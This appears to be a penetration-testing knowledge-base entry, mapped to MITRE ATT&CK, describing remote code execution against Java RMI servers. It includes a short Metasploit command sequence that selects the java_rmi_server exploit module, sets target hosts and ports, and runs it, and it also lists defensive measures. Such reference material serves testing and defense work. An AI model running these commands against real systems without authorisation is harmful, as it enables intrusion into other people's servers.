---
id: 441e0c62-f74e-4d08-8938-dd4e04b30939
name: Java RMI Server RCE using Metasploit
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:00.970641+00:00'
updated_at: '2023-04-06T03:56:00.983999+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Remote Services|T1021 - Remote Services]]'
tags:
- '[[Exploitation]]'
- '[[Java RMI]]'
- '[[RCE using Metasploit]]'
commands:
- '[[Configure Java RMI Server Exploit]]'
---

# Java RMI Server RCE using Metasploit

## Summary

Java Remote Method Invocation (RMI) is a Java API that allows remote execution of methods between Java Virtual Machines (JVMs). This exploit uses Metasploit framework to exploit Java RMI servers to execute arbitrary code on the target system. The attacker can use this exploit to gain remote access 

## Description

# Description

Java Remote Method Invocation (RMI) is a Java API that allows remote execution of methods between Java Virtual Machines (JVMs). This exploit uses Metasploit framework to exploit Java RMI servers to execute arbitrary code on the target system. The attacker can use this exploit to gain remote access to the target system and perform various malicious activities such as data exfiltration, privilege escalation, and lateral movement. This technique is commonly used by threat actors to target enterprise networks.

## Requirements

1. Access to a vulnerable Java RMI server

1. Metasploit framework installed on the attacker's machine

## Defense

1. Ensure that all Java RMI servers are properly configured and secured

1. Use network segmentation to isolate critical systems from the rest of the network

1. Regularly monitor network traffic for any suspicious activity

## Objectives

1. Gain remote access to the target system

1. Execute arbitrary code on the target system

# Instructions

1. 1. Set the target IP address and port
2. Configure the payload if needed
3. Run the exploit

**Code**: [[use exploit/multi/misc/java_rmi_server
set RHOSTS ]]

> This command sets the exploit module to use, sets the target IP address and port, and runs the exploit. The payload can also be configured if needed.

**Command** ([[Configure Java RMI Server Exploit]]):

```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
# configure also the payload if needed
run
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Remote Services|T1021 - Remote Services]]

## Commands Used

- [[Configure Java RMI Server Exploit]]

## Tags

- [[Exploitation]]
- [[Java RMI]]
- [[RCE using Metasploit]]
